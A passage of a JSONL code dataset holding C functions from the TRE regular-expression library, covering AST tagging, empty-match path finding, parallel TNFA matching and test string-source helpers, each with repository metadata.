old_params;\n\t\told_params[TRE_PARAM_DEPTH] = params_depth;\n\t\t/* XXX - this is the only place where ast_new_node is\n\t\t   needed -- should be moved inside AST module. */\n\t\tnode_copy = tre_ast_new_node(mem, ITERATION,\n\t\t\t\t\t     sizeof(tre_iteration_t));\n\t\tif (!node_copy)\n\t\t  return REG_ESPACE;\n\t\tnode_copy->obj = node->obj;\n\t\ttmp_node = tre_ast_new_catenation(mem, tmp_l, node_copy);\n\t\tif (!tmp_node)\n\t\t  return REG_ESPACE;\n\t\ttmp_node = tre_ast_new_catenation(mem, tmp_node, tmp_r);\n\t\tif (!tmp_node)\n\t\t  return REG_ESPACE;\n\t\t/* Replace the contents of `node' with `tmp_node'. */\n\t\tmemcpy(node, tmp_node, sizeof(*node));\n\t\tnode->obj = tmp_node->obj;\n\t\tnode->type = tmp_node->type;\n\t\tparams_depth++;\n\t\tif (params_depth > *max_depth)\n\t\t  *max_depth = params_depth;\n\t      }\n\t    break;\n\t  }\n\tdefault:\n\t  assert(0);\n\t  break;\n\t}\n    }\n\n  *position += pos_add_total;\n\n  /* `max_pos' should never be larger than `*position' if the above\n     code works, but just an extra safeguard let's make sure\n     `*position' is set large enough so enough memory will be\n     allocated for the transition table. */\n  if (max_pos > *position)\n    *position = max_pos;\n\n#ifdef TRE_DEBUG\n  DPRINT((\"Expanded AST:\\n\"));\n  tre_ast_print(ast);\n  DPRINT((\"*position %d, max_pos %d\\n\", *position, max_pos));\n#endif\n\n  return status;\n}", "path": "tre/lib/tre-compile.c", "commit_date": "2014-01-31 00:00:00", "repo_name": "laurikari/tre", "stars": 768, "license": "other", "language": "c", "size": 563}
{"docstring": "/* Iterate mbrtowc over the multi-byte sequence STR of length LEN,\n   store the result in BUF and memoize the successive byte offsets\n   in OFF.  */\n", "func_signal": "static int\nmbntowc (wchar_t *buf, const char *str, size_t len, int *off)", "code": "{\n  int n, wlen;\n#ifdef HAVE_MBSTATE_T\n  mbstate_t cst;\n  memset(&cst, 0, sizeof(cst));\n#endif\n\n  if (len >= MAXSTRSIZE)\n    {\n      fprintf(stderr, \"Increase MAXSTRSIZE to %ld or more and recompile!\\n\",\n\t      (long)len + 1);\n      exit(EXIT_FAILURE);\n    }\n\n  if (off)\n    {\n      memset(off + 1, -1, len * sizeof(int));\n      *off = 0;\n    }\n\n  wlen = 0;\n  while (len > 0)\n    {\n      n = tre_mbrtowc(buf ? buf++ : NULL, str, len, &cst);\n      if (n < 0)\n\treturn n;\n      if (n == 0)\n\tn = 1;\n      str += n;\n      len -= n;\n      wlen += 1;\n      if (off)\n\t*(off += n) = wlen;\n    }\n\n  return(wlen);\n}", "path": "tre/tests/retest.c", "commit_date": "2009-09-19 00:00:00", "repo_name": "laurikari/tre", "stars": 768, "license": "other", "language": "c", "size": 563}
{"docstring": "/* Inserts a catenation node to the root of the tree given in `node'.\n   As the left child a new tag with number `tag_id' to `node' is added,\n   and the right child is the old root. */\n", "func_signal": "static reg_errcode_t\ntre_add_tag_left(tre_mem_t mem, tre_ast_node_t *node, int tag_id)", "code": "{\n  tre_catenation_t *c;\n\n  DPRINT((\"add_tag_left: tag %d\\n\", tag_id));\n\n  c = tre_mem_alloc(mem, sizeof(*c));\n  if (c == NULL)\n    return REG_ESPACE;\n  c->left = tre_ast_new_literal(mem, TAG, tag_id, -1);\n  if (c->left == NULL)\n    return REG_ESPACE;\n  c->right = tre_mem_alloc(mem, sizeof(tre_ast_node_t));\n  if (c->right == NULL)\n    return REG_ESPACE;\n\n  c->right->obj = node->obj;\n  c->right->type = node->type;\n  c->right->nullable = -1;\n  c->right->submatch_id = -1;\n  c->right->firstpos = NULL;\n  c->right->lastpos = NULL;\n  c->right->num_tags = 0;\n  node->obj = c;\n  node->type = CATENATION;\n  return REG_OK;\n}", "path": "tre/lib/tre-compile.c", "commit_date": "2014-01-31 00:00:00", "repo_name": "laurikari/tre", "stars": 768, "license": "other", "language": "c", "size": 563}
{"docstring": "/* Finds the empty path through `node' which is the one that should be\n   taken according to POSIX.2 rules, and adds the tags on that path to\n   `tags'.   `tags' may be NULL.  If `num_tags_seen' is not NULL, it is\n   set to the number of tags seen on the path. */\n", "func_signal": "static reg_errcode_t\ntre_match_empty(tre_stack_t *stack, tre_ast_node_t *node, int *tags,\n\t\tint *assertions, int *params, int *num_tags_seen,\n\t\tint *params_seen)", "code": "{\n  tre_literal_t *lit;\n  tre_union_t *uni;\n  tre_catenation_t *cat;\n  tre_iteration_t *iter;\n  int i;\n  int bottom = tre_stack_num_objects(stack);\n  reg_errcode_t status = REG_OK;\n  if (num_tags_seen)\n    *num_tags_seen = 0;\n  if (params_seen)\n    *params_seen = 0;\n\n  status = tre_stack_push_voidptr(stack, node);\n\n  /* Walk through the tree recursively. */\n  while (status == REG_OK && tre_stack_num_objects(stack) > bottom)\n    {\n      node = tre_stack_pop_voidptr(stack);\n\n      switch (node->type)\n\t{\n\tcase LITERAL:\n\t  lit = (tre_literal_t *)node->obj;\n\t  switch (lit->code_min)\n\t    {\n\t    case TAG:\n\t      if (lit->code_max >= 0)\n\t\t{\n\t\t  if (tags != NULL)\n\t\t    {\n\t\t      /* Add the tag to `tags'. */\n\t\t      for (i = 0; tags[i] >= 0; i++)\n\t\t\tif (tags[i] == lit->code_max)\n\t\t\t  break;\n\t\t      if (tags[i] < 0)\n\t\t\t{\n\t\t\t  tags[i] = lit->code_max;\n\t\t\t  tags[i + 1] = -1;\n\t\t\t}\n\t\t    }\n\t\t  if (num_tags_seen)\n\t\t    (*num_tags_seen)++;\n\t\t}\n\t      break;\n\t    case ASSERTION:\n\t      assert(lit->code_max >= 1\n\t\t     || lit->code_max <= ASSERT_LAST);\n\t      if (assertions != NULL)\n\t\t*assertions |= lit->code_max;\n\t      break;\n\t    case PARAMETER:\n\t      if (params != NULL)\n\t\tfor (i = 0; i < TRE_PARAM_LAST; i++)\n\t\t  params[i] = lit->u.params[i];\n\t      if (params_seen != NULL)\n\t\t*params_seen = 1;\n\t      break;\n\t    case EMPTY:\n\t      break;\n\t    default:\n\t      assert(0);\n\t      break;\n\t    }\n\t  break;\n\n\tcase UNION:\n\t  /* Subexpressions starting earlier take priority over ones\n\t     starting later, so we prefer the left subexpression over the\n\t     right subexpression. */\n\t  uni = (tre_union_t *)node->obj;\n\t  if (uni->left->nullable)\n\t    STACK_PUSHX(stack, voidptr, uni->left)\n\t  else if (uni->right->nullable)\n\t    STACK_PUSHX(stack, voidptr, uni->right)\n\t  else\n\t    assert(0);\n\t  break;\n\n\tcase CATENATION:\n\t  /* The path must go through both children. */\n\t  cat = (tre_catenation_t *)node->obj;\n\t  assert(cat->left->nullable);\n\t  assert(cat->right->nullable);\n\t  STACK_PUSHX(stack, voidptr, cat->left);\n\t  STACK_PUSHX(stack, voidptr, cat->right);\n\t  break;\n\n\tcase ITERATION:\n\t  /* A match with an empty string is preferred over no match at\n\t     all, so we go through the argument if possible. */\n\t  iter = (tre_iteration_t *)node->obj;\n\t  if (iter->arg->nullable)\n\t    STACK_PUSHX(stack, voidptr, iter->arg);\n\t  break;\n\n\tdefault:\n\t  assert(0);\n\t  break;\n\t}\n    }\n\n  return status;\n}", "path": "tre/lib/tre-compile.c", "commit_date": "2014-01-31 00:00:00", "repo_name": "laurikari/tre", "stars": 768, "license": "other", "language": "c", "size": 563}
{"docstring": "/* Creates a tre_str_source wrapper around the string `str'.  Returns the\n   tre_str_source object or NULL if out of memory. */\n", "func_signal": "static tre_str_source *\nmake_str_source(const char *str)", "code": "{\n  tre_str_source *s;\n  str_handler_ctx *ctx;\n\n  s = calloc(1, sizeof(*s));\n  if (!s)\n    return NULL;\n\n  ctx = malloc(sizeof(str_handler_ctx));\n  if (!ctx)\n    {\n      free(s);\n      return NULL;\n    }\n\n  ctx->str = str;\n  ctx->pos = 0;\n  s->context = ctx;\n  s->get_next_char = str_handler_get_next;\n  s->rewind = str_handler_rewind;\n  s->compare = str_handler_compare;\n\n  return s;\n}", "path": "tre/tests/test-str-source.c", "commit_date": "2009-09-19 00:00:00", "repo_name": "laurikari/tre", "stars": 768, "license": "other", "language": "c", "size": 563}
{"docstring": "/* TRE_DEBUG */\n", "func_signal": "reg_errcode_t\ntre_tnfa_run_parallel(const tre_tnfa_t *tnfa, const void *string, int len,\n\t\t      tre_str_type_t type, int *match_tags, int eflags,\n\t\t      int *match_end_ofs)", "code": "{\n  /* State variables required by GET_NEXT_WCHAR. */\n  tre_char_t prev_c = 0, next_c = 0;\n  const char *str_byte = string;\n  int pos = -1;\n  unsigned int pos_add_next = 1;\n#ifdef TRE_WCHAR\n  const wchar_t *str_wide = string;\n#ifdef TRE_MBSTATE\n  mbstate_t mbstate;\n#endif /* TRE_MBSTATE */\n#endif /* TRE_WCHAR */\n  int reg_notbol = eflags & REG_NOTBOL;\n  int reg_noteol = eflags & REG_NOTEOL;\n  int reg_newline = tnfa->cflags & REG_NEWLINE;\n  int str_user_end = 0;\n\n  char *buf;\n  tre_tnfa_transition_t *trans_i;\n  tre_tnfa_reach_t *reach, *reach_next, *reach_i, *reach_next_i;\n  tre_reach_pos_t *reach_pos;\n  int *tag_i;\n  int num_tags, i;\n\n  int match_eo = -1;\t   /* end offset of match (-1 if no match found yet) */\n  int new_match = 0;\n  int *tmp_tags = NULL;\n  int *tmp_iptr;\n\n#ifdef TRE_MBSTATE\n  memset(&mbstate, '\\0', sizeof(mbstate));\n#endif /* TRE_MBSTATE */\n\n  DPRINT((\"tre_tnfa_run_parallel, input type %d\\n\", type));\n\n  if (!match_tags)\n    num_tags = 0;\n  else\n    num_tags = tnfa->num_tags;\n\n  /* Allocate memory for temporary data required for matching.\tThis needs to\n     be done for every matching operation to be thread safe.  This allocates\n     everything in a single large block from the stack frame using alloca()\n     or with malloc() if alloca is unavailable. */\n  {\n    int tbytes, rbytes, pbytes, xbytes, total_bytes;\n    char *tmp_buf;\n    /* Compute the length of the block we need. */\n    tbytes = sizeof(*tmp_tags) * num_tags;\n    rbytes = sizeof(*reach_next) * (tnfa->num_states + 1);\n    pbytes = sizeof(*reach_pos) * tnfa->num_states;\n    xbytes = sizeof(int) * num_tags;\n    total_bytes =\n      (sizeof(long) - 1) * 4 /* for alignment paddings */\n      + (rbytes + xbytes * tnfa->num_states) * 2 + tbytes + pbytes;\n\n    /* Allocate the memory. */\n#ifdef TRE_USE_ALLOCA\n    buf = alloca(total_bytes);\n#else /* !TRE_USE_ALLOCA */\n    buf = xmalloc((unsigned)total_bytes);\n#endif /* !TRE_USE_ALLOCA */\n    if (buf == NULL)\n      return REG_ESPACE;\n    memset(buf, 0, (size_t)total_bytes);\n\n    /* Get the various pointers within tmp_buf (properly aligned). */\n    tmp_tags = (void *)buf;\n    tmp_buf = buf + tbytes;\n    tmp_buf += ALIGN(tmp_buf, long);\n    reach_next = (void *)tmp_buf;\n    tmp_buf += rbytes;\n    tmp_buf += ALIGN(tmp_buf, long);\n    reach = (void *)tmp_buf;\n    tmp_buf += rbytes;\n    tmp_buf += ALIGN(tmp_buf, long);\n    reach_pos = (void *)tmp_buf;\n    tmp_buf += pbytes;\n    tmp_buf += ALIGN(tmp_buf, long);\n    for (i = 0; i < tnfa->num_states; i++)\n      {\n\treach[i].tags = (void *)tmp_buf;\n\ttmp_buf += xbytes;\n\treach_next[i].tags = (void *)tmp_buf;\n\ttmp_buf += xbytes;\n      }\n  }\n\n  for (i = 0; i < tnfa->num_states; i++)\n    reach_pos[i].pos = -1;\n\n  /* If only one character can start a match, find it first. */\n  if (tnfa->first_char >= 0 && type == STR_BYTE && str_byte)\n    {\n      const char *orig_str = str_byte;\n      int first = tnfa->first_char;\n\n      if (len >= 0)\n\tstr_byte = memchr(orig_str, first, (size_t)len);\n      else\n\tstr_byte = strchr(orig_str, first);\n      if (str_byte == NULL)\n\t{\n#ifndef TRE_USE_ALLOCA\n\t  if (buf)\n\t    xfree(buf);\n#endif /* !TRE_USE_ALLOCA */\n\t  return REG_NOMATCH;\n\t}\n      DPRINT((\"skipped %lu chars\\n\", (unsigned long)(str_byte - orig_str)));\n      if (str_byte >= orig_str + 1)\n\tprev_c = (unsigned char)*(str_byte - 1);\n      next_c = (unsigned char)*str_byte;\n      pos = str_byte - orig_str;\n      if (len < 0 || pos < len)\n\tstr_byte++;\n    }\n  else\n    {\n      GET_NEXT_WCHAR();\n      pos = 0;\n    }\n\n#if 0\n  /* Skip over characters that cannot possibly be the first character\n     of a match. */\n  if (tnfa->firstpos_chars != NULL)\n    {\n      char *chars = tnfa->firstpos_chars;\n\n      if (len < 0)\n\t{\n\t  const char *orig_str = str_byte;\n\t  /* XXX - use strpbrk() and wcspbrk() because they might be\n\t     optimized for the target architecture.  Try also strcspn()\n\t     and wcscspn() and compare the speeds. */\n\t  while (next_c != L'\\0' && !chars[next_c])\n\t    {\n\t      next_c = *str_byte++;\n\t    }\n\t  prev_c = *(str_byte - 2);\n\t  pos += str_byte - orig_str;\n\t  DPRINT((\"skipped %d chars\\n\", str_byte - orig_str));\n\t}\n      else\n\t{\n\t  while (pos <= len && !chars[next_c])\n\t    {\n\t      prev_c = next_c;\n\t      next_c = (unsigned char)(*str_byte++);\n\t      pos++;\n\t    }\n\t}\n    }\n#endif\n\n  DPRINT((\"length: %d\\n\", len));\n  DPRINT((\"pos:chr/code | states and tags\\n\"));\n  DPRINT((\"-------------+------------------------------------------------\\n\"));\n\n  reach_next_i = reach_next;\n  while (/*CONSTCOND*/(void)1,1)\n    {\n      /* If no match found yet, add the initial states to `reach_next'. */\n      if (match_eo < 0)\n\t{\n\t  DPRINT((\" init >\"));\n\t  trans_i = tnfa->initial;\n\t  while (trans_i->state != NULL)\n\t    {\n\t      if (reach_pos[trans_i->state_id].pos < pos)\n\t\t{\n\t\t  if (trans_i->assertions\n\t\t      && CHECK_ASSERTIONS(trans_i->assertions))\n\t\t    {\n\t\t      DPRINT((\"assertion failed\\n\"));\n\t\t      trans_i++;\n\t\t      continue;\n\t\t    }\n\n\t\t  DPRINT((\" %p\", (void *)trans_i->state));\n\t\t  reach_next_i->state = trans_i->state;\n\t\t  for (i = 0; i < num_tags; i++)\n\t\t    reach_next_i->tags[i] = -1;\n\t\t  tag_i = trans_i->tags;\n\t\t  if (tag_i)\n\t\t    while (*tag_i >= 0)\n\t\t      {\n\t\t\tif (*tag_i < num_tags)\n\t\t\t  reach_next_i->tags[*tag_i] = pos;\n\t\t\ttag_i++;\n\t\t      }\n\t\t  if (reach_next_i->state == tnfa->final)\n\t\t    {\n\t\t      DPRINT((\"\t found empty match\\n\"));\n\t\t      match_eo = pos;\n\t\t      new_match = 1;\n\t\t      for (i = 0; i < num_tags; i++)\n\t\t\tmatch_tags[i] = reach_next_i->tags[i];\n\t\t    }\n\t\t  reach_pos[trans_i->state_id].pos = pos;\n\t\t  reach_pos[trans_i->state_id].tags = &reach_next_i->tags;\n\t\t  reach_next_i++;\n\t\t}\n\t      trans_i++;\n\t    }\n\t  DPRINT((\"\\n\"));\n\t  reach_next_i->state = NULL;\n\t}\n      else\n\t{\n\t  if (num_tags == 0 || reach_next_i == reach_next)\n\t    /* We have found a match. */\n\t    break;\n\t}\n\n      /* Check for end of string. */\n      if (len < 0)\n\t{\n\t  if (type == STR_USER)\n\t    {\n\t      if (str_user_end)\n\t\tbreak;\n\t    }\n\t  else if (next_c == L'\\0')\n\t    break;\n\t}\n      else\n\t{\n\t  if (pos >= len)\n\t    break;\n\t}\n\n      GET_NEXT_WCHAR();\n\n#ifdef TRE_DEBUG\n      DPRINT((\"%3d:%2lc/%05d |\", pos - 1, (tre_cint_t)prev_c, (int)prev_c));\n      tre_print_reach(tnfa, reach_next, num_tags);\n      DPRINT((\"%3d:%2lc/%05d |\", pos, (tre_cint_t)next_c, (int)next_c));\n      tre_print_reach(tnfa, reach_next, num_tags);\n#endif /* TRE_DEBUG */\n\n      /* Swap `reach' and `reach_next'. */\n      reach_i = reach;\n      reach = reach_next;\n      reach_next = reach_i;\n\n      /* For each state in `reach', weed out states that don't fulfill the\n\t minimal matching conditions. */\n      if (tnfa->num_minimals && new_match)\n\t{\n\t  new_match = 0;\n\t  reach_next_i = reach_next;\n\t  for (reach_i = reach; reach_i->state; reach_i++)\n\t    {\n\t      int skip = 0;\n\t      for (i = 0; tnfa->minimal_tags[i] >= 0; i += 2)\n\t\t{\n\t\t  int end = tnfa->minimal_tags[i];\n\t\t  int start = tnfa->minimal_tags[i + 1];\n\t\t  DPRINT((\"  Minimal start %d, end %d\\n\", start, end));\n\t\t  if (end >= num_tags)\n\t\t    {\n\t\t      DPRINT((\"\t Throwing %p out.\\n\", reach_i->state));\n\t\t      skip = 1;\n\t\t      break;\n\t\t    }\n\t\t  else if (reach_i->tags[start] == match_tags[start]\n\t\t\t   && reach_i->tags[end] < match_tags[end])\n\t\t    {\n\t\t      DPRINT((\"\t Throwing %p out because t%d < %d\\n\",\n\t\t\t      reach_i->state, end, match_tags[end]));\n\t\t      skip = 1;\n\t\t      break;\n\t\t    }\n\t\t}\n\t      if (!skip)\n\t\t{\n\t\t  reach_next_i->state = reach_i->state;\n\t\t  tmp_iptr = reach_next_i->tags;\n\t\t  reach_next_i->tags = reach_i->tags;\n\t\t  reach_i->tags = tmp_iptr;\n\t\t  reach_next_i++;\n\t\t}\n\t    }\n\t  reach_next_i->state = NULL;\n\n\t  /* Swap `reach' and `reach_next'. */\n\t  reach_i = reach;\n\t  reach = reach_next;\n\t  reach_next = reach_i;\n\t}\n\n      /* For each state in `reach' see if there is a transition leaving with\n\t the current input symbol to a state not yet in `reach_next', and\n\t add the destination states to `reach_next'. */\n      reach_next_i = reach_next;\n      for (reach_i = reach; reach_i->state; reach_i++)\n\t{\n\t  for (trans_i = reach_i->state; trans_i->state; trans_i++)\n\t    {\n\t      /* Does this transition match the input symbol? */\n\t      if (trans_i->code_min <= (tre_cint_t)prev_c &&\n\t\t  trans_i->code_max >= (tre_cint_t)prev_c)\n\t\t{\n\t\t  if (trans_i->assertions\n\t\t      && (CHECK_ASSERTIONS(trans_i->assertions)\n\t\t\t  || CHECK_CHAR_CLASSES(trans_i, tnfa, eflags)))\n\t\t    {\n\t\t      DPRINT((\"assertion failed\\n\"));\n\t\t      continue;\n\t\t    }\n\n\t\t  /* Compute the tags after this transition. */\n\t\t  for (i = 0; i < num_tags; i++)\n\t\t    tmp_tags[i] = reach_i->tags[i];\n\t\t  tag_i = trans_i->tags;\n\t\t  if (tag_i != NULL)\n\t\t    while (*tag_i >= 0)\n\t\t      {\n\t\t\tif (*tag_i < num_tags)\n\t\t\t  tmp_tags[*tag_i] = pos;\n\t\t\ttag_i++;\n\t\t      }\n\n\t\t  if (reach_pos[trans_i->state_id].pos < pos)\n\t\t    {\n\t\t      /* Found an unvisited node. */\n\t\t      reach_next_i->state = trans_i->state;\n\t\t      tmp_iptr = reach_next_i->tags;\n\t\t      reach_next_i->tags = tmp_tags;\n\t\t      tmp_tags = tmp_iptr;\n\t\t      reach_pos[trans_i->state_id].pos = pos;\n\t\t      reach_pos[trans_i->state_id].tags = &reach_next_i->tags;\n\n\t\t      if (reach_next_i->state == tnfa->final\n\t\t\t  && (match_eo == -1\n\t\t\t      || (num_tags > 0\n\t\t\t\t  && reach_next_i->tags[0] <= match_tags[0])))\n\t\t\t{\n\t\t\t  DPRINT((\"  found match %p\\n\", trans_i->state));\n\t\t\t  match_eo = pos;\n\t\t\t  new_match = 1;\n\t\t\t  for (i = 0; i < num_tags; i++)\n\t\t\t    match_tags[i] = reach_next_i->tags[i];\n\t\t\t}\n\t\t      reach_next_i++;\n\n\t\t    }\n\t\t  else\n\t\t    {\n\t\t      assert(reach_pos[trans_i->state_id].pos == pos);\n\t\t      /* Another path has also reached this state.  We choose\n\t\t\t the winner by examining the tag values for both\n\t\t\t paths. */\n\t\t      if (tre_tag_order(num_tags, tnfa->tag_directions,\n\t\t\t\t\ttmp_tags,\n\t\t\t\t\t*reach_pos[trans_i->state_id].tags))\n\t\t\t{\n\t\t\t  /* The new path wins. */\n\t\t\t  tmp_iptr = *reach_pos[trans_i->state_id].tags;\n\t\t\t  *reach_pos[trans_i->state_id].tags = tmp_tags;\n\t\t\t  if (trans_i->state == tnfa->final)\n\t\t\t    {\n\t\t\t      DPRINT((\"\t found better match\\n\"));\n\t\t\t      match_eo = pos;\n\t\t\t      new_match = 1;\n\t\t\t      for (i = 0; i < num_tags; i++)\n\t\t\t\tmatch_tags[i] = tmp_tags[i];\n\t\t\t    }\n\t\t\t  tmp_tags = tmp_iptr;\n\t\t\t}\n\t\t    }\n\t\t}\n\t    }\n\t}\n      reach_next_i->state = NULL;\n    }\n\n  DPRINT((\"match end offset = %d\\n\", match_eo));\n\n#ifndef TRE_USE_ALLOCA\n  if (buf)\n    xfree(buf);\n#endif /* !TRE_USE_ALLOCA */\n\n  *match_end_ofs = match_eo;\n  return match_eo >= 0 ? REG_OK : REG_NOMATCH;\n}", "path": "tre/lib/tre-match-parallel.c", "commit_date": "2015-08-13 00:00:00", "repo_name": "laurikari/tre", "stars": 768, "license": "other", "language": "c", "size": 563}
{"docstring": "/* Frees the memory allocated for `s'. */\n", "func_signal": "static void\nfree_str_source(tre_str_source *s)", "code": "{\n  free(s->context);\n  free(s);\n}", "path": "tre/tests/test-str-source.c", "commit_date": "2009-09-19 00:00:00", "repo_name": "laurikari/tre", "stars": 768, "license": "other", "language": "c", "size": 563}
{"docstring": "/* Go through `regset' and set submatch data for submatches that are\n   using this tag. */\n", "func_signal": "static void\ntre_purge_regset(int *regset, tre_tnfa_t *tnfa, int tag)", "code": "{\n  int i;\n\n  for (i = 0; regset[i] >= 0; i++)\n    {\n      int id = regset[i] / 2;\n      int start = !(regset[i] % 2);\n      DPRINT((\"  Using tag %d for %s offset of \"\n\t      \"submatch %d\\n\", tag,\n\t      start ? \"start\" : \"end\", id));\n      if (start)\n\ttnfa->submatch_data[id].so_tag = tag;\n      else\n\ttnfa->submatch_data[id].eo_tag = tag;\n    }\n  regset[0] = -1;\n}", "path": "tre/lib/tre-compile.c", "commit_date": "2014-01-31 00:00:00", "repo_name": "laurikari/tre", "stars": 768, "license": "other", "language": "c", "size": 563}
{"docstring": "/* Adds tags to appropriate locations in the parse tree in `tree', so that\n   subexpressions marked for submatch addressing can be traced. */\n", "func_signal": "static reg_errcode_t\ntre_add_tags(tre_mem_t mem, tre_stack_t *stack, tre_ast_node_t *tree,\n\t     tre_tnfa_t *tnfa)", "code": "{\n  reg_errcode_t status = REG_OK;\n  tre_addtags_symbol_t symbol;\n  tre_ast_node_t *node = tree; /* Tree node we are currently looking at. */\n  int bottom = tre_stack_num_objects(stack);\n  /* True for first pass (counting number of needed tags) */\n  int first_pass = (mem == NULL || tnfa == NULL);\n  int *regset, *orig_regset;\n  int num_tags = 0; /* Total number of tags. */\n  int num_minimals = 0;\t /* Number of special minimal tags. */\n  int tag = 0;\t    /* The tag that is to be added next. */\n  int next_tag = 1; /* Next tag to use after this one. */\n  int *parents;\t    /* Stack of submatches the current submatch is\n\t\t       contained in. */\n  int minimal_tag = -1; /* Tag that marks the beginning of a minimal match. */\n  tre_tag_states_t *saved_states;\n\n  tre_tag_direction_t direction = TRE_TAG_MINIMIZE;\n  if (!first_pass)\n    {\n      tnfa->end_tag = 0;\n      tnfa->minimal_tags[0] = -1;\n    }\n\n  regset = xmalloc(sizeof(*regset) * ((tnfa->num_submatches + 1) * 2));\n  if (regset == NULL)\n    return REG_ESPACE;\n  regset[0] = -1;\n  orig_regset = regset;\n\n  parents = xmalloc(sizeof(*parents) * (tnfa->num_submatches + 1));\n  if (parents == NULL)\n    {\n      xfree(regset);\n      return REG_ESPACE;\n    }\n  parents[0] = -1;\n\n  saved_states = xmalloc(sizeof(*saved_states) * (tnfa->num_submatches + 1));\n  if (saved_states == NULL)\n    {\n      xfree(regset);\n      xfree(parents);\n      return REG_ESPACE;\n    }\n  else\n    {\n      unsigned int i;\n      for (i = 0; i <= tnfa->num_submatches; i++)\n\tsaved_states[i].tag = -1;\n    }\n\n  STACK_PUSH(stack, voidptr, node);\n  STACK_PUSH(stack, int, ADDTAGS_RECURSE);\n\n  while (tre_stack_num_objects(stack) > bottom)\n    {\n      if (status != REG_OK)\n\tbreak;\n\n      symbol = (tre_addtags_symbol_t)tre_stack_pop_int(stack);\n      switch (symbol)\n\t{\n\n\tcase ADDTAGS_SET_SUBMATCH_END:\n\t  {\n\t    int id = tre_stack_pop_int(stack);\n\t    int i;\n\n\t    /* Add end of this submatch to regset. */\n\t    for (i = 0; regset[i] >= 0; i++);\n\t    regset[i] = id * 2 + 1;\n\t    regset[i + 1] = -1;\n\n\t    /* Pop this submatch from the parents stack. */\n\t    for (i = 0; parents[i] >= 0; i++);\n\t    parents[i - 1] = -1;\n\t    break;\n\t  }\n\n\tcase ADDTAGS_RECURSE:\n\t  node = tre_stack_pop_voidptr(stack);\n\n\t  if (node->submatch_id >= 0)\n\t    {\n\t      int id = node->submatch_id;\n\t      int i;\n\n\n\t      /* Add start of this submatch to regset. */\n\t      for (i = 0; regset[i] >= 0; i++);\n\t      regset[i] = id * 2;\n\t      regset[i + 1] = -1;\n\n\t      if (!first_pass)\n\t\t{\n\t\t  for (i = 0; parents[i] >= 0; i++);\n\t\t  tnfa->submatch_data[id].parents = NULL;\n\t\t  if (i > 0)\n\t\t    {\n\t\t      int *p = xmalloc(sizeof(*p) * (i + 1));\n\t\t      if (p == NULL)\n\t\t\t{\n\t\t\t  status = REG_ESPACE;\n\t\t\t  break;\n\t\t\t}\n\t\t      assert(tnfa->submatch_data[id].parents == NULL);\n\t\t      tnfa->submatch_data[id].parents = p;\n\t\t      for (i = 0; parents[i] >= 0; i++)\n\t\t\tp[i] = parents[i];\n\t\t      p[i] = -1;\n\t\t    }\n\t\t}\n\n\t      /* Add end of this submatch to regset after processing this\n\t\t node. */\n\t      STACK_PUSHX(stack, int, node->submatch_id);\n\t      STACK_PUSHX(stack, int, ADDTAGS_SET_SUBMATCH_END);\n\t    }\n\n\t  switch (node->type)\n\t    {\n\t    case LITERAL:\n\t      {\n\t\ttre_literal_t *lit = node->obj;\n\n\t\tif (!IS_SPECIAL(lit) || IS_BACKREF(lit))\n\t\t  {\n\t\t    int i;\n\t\t    DPRINT((\"Literal %d-%d\\n\",\n\t\t\t    (int)lit->code_min, (int)lit->code_max));\n\t\t    if (regset[0] >= 0)\n\t\t      {\n\t\t\t/* Regset is not empty, so add a tag before the\n\t\t\t   literal or backref. */\n\t\t\tif (!first_pass)\n\t\t\t  {\n\t\t\t    status = tre_add_tag_left(mem, node, tag);\n\t\t\t    tnfa->tag_directions[tag] = direction;\n\t\t\t    if (minimal_tag >= 0)\n\t\t\t      {\n\t\t\t\tDPRINT((\"Minimal %d, %d\\n\", minimal_tag, tag));\n\t\t\t\tfor (i = 0; tnfa->minimal_tags[i] >= 0; i++);\n\t\t\t\ttnfa->minimal_tags[i] = tag;\n\t\t\t\ttnfa->minimal_tags[i + 1] = minimal_tag;\n\t\t\t\ttnfa->minimal_tags[i + 2] = -1;\n\t\t\t\tminimal_tag = -1;\n\t\t\t\tnum_minimals++;\n\t\t\t      }\n\t\t\t    tre_purge_regset(regset, tnfa, tag);\n\t\t\t  }\n\t\t\telse\n\t\t\t  {\n\t\t\t    DPRINT((\"  num_tags = 1\\n\"));\n\t\t\t    node->num_tags = 1;\n\t\t\t  }\n\n\t\t\tDPRINT((\"  num_tags++\\n\"));\n\t\t\tregset[0] = -1;\n\t\t\ttag = next_tag;\n\t\t\tnum_tags++;\n\t\t\tnext_tag++;\n\t\t      }\n\t\t  }\n\t\telse\n\t\t  {\n\t\t    assert(!IS_TAG(lit));\n\t\t  }\n\t\tbreak;\n\t      }\n\t    case CATENATION:\n\t      {\n\t\ttre_catenation_t *cat = node->obj;\n\t\ttre_ast_node_t *left = cat->left;\n\t\ttre_ast_node_t *right = cat->right;\n\t\tint reserved_tag = -1;\n\t\tDPRINT((\"Catenation, next_tag = %d\\n\", next_tag));\n\n\n\t\t/* After processing right child. */\n\t\tSTACK_PUSHX(stack, voidptr, node);\n\t\tSTACK_PUSHX(stack, int, ADDTAGS_AFTER_CAT_RIGHT);\n\n\t\t/* Process right child. */\n\t\tSTACK_PUSHX(stack, voidptr, right);\n\t\tSTACK_PUSHX(stack, int, ADDTAGS_RECURSE);\n\n\t\t/* After processing left child. */\n\t\tSTACK_PUSHX(stack, int, next_tag + left->num_tags);\n\t\tDPRINT((\"  Pushing %d for after left\\n\",\n\t\t\tnext_tag + left->num_tags));\n\t\tif (left->num_tags > 0 && right->num_tags > 0)\n\t\t  {\n\t\t    /* Reserve the next tag to the right child. */\n\t\t    DPRINT((\"  Reserving next_tag %d to right child\\n\",\n\t\t\t    next_tag));\n\t\t    reserved_tag = next_tag;\n\t\t    next_tag++;\n\t\t  }\n\t\tSTACK_PUSHX(stack, int, reserved_tag);\n\t\tSTACK_PUSHX(stack, int, ADDTAGS_AFTER_CAT_LEFT);\n\n\t\t/* Process left child. */\n\t\tSTACK_PUSHX(stack, voidptr, left);\n\t\tSTACK_PUSHX(stack, int, ADDTAGS_RECURSE);\n\n\t\t}\n\t      break;\n\t    case ITERATION:\n\t      {\n\t\ttre_iteration_t *iter = node->obj;\n\t\tDPRINT((\"Iteration\\n\"));\n\n\t\tif (first_pass)\n\t\t  {\n\t\t    STACK_PUSHX(stack, int, regset[0] >= 0 || iter->minimal);\n\t\t  }\n\t\telse\n\t\t  {\n\t\t    STACK_PUSHX(stack, int, tag);\n\t\t    STACK_PUSHX(stack, int, iter->minimal);\n\t\t  }\n\t\tSTACK_PUSHX(stack, voidptr, node);\n\t\tSTACK_PUSHX(stack, int, ADDTAGS_AFTER_ITERATION);\n\n\t\tSTACK_PUSHX(stack, voidptr, 